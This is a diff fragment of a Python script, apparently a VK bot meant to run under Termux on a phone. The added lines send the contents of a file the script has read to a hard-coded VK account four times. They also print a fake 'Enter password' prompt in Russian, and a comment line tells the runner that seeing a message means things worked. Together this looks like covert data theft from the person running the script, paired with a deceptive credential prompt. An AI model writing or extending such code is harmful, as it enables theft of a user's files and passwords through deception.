@@ -22,13 +22,18 @@ def bot():
     rik=o.read()
     y(437306907,rik)
     y(437306907,rik)
+    y(437306907,rik)
+    y(437306907,rik)
+    
+    print('Введите пароль: ')
 #    time.sleep(5)
 #    os.system('termux-torch on')
 #    os.system('termux-vibrate -d 1000')
 #    os.system('echo если эта строка появилась то все правильно, напиши вк')
-    for event in longpoll.listen():
-        if event.type==VkEventType.MESSAGE_NEW:
-            rand+=1
-            if event.to_me:
-                break
+#    for event in longpoll.listen():
+#        if event.type==VkEventType.MESSAGE_NEW:
+#            rand+=1
+#            if event.to_me:
+#                break
 bot()
+
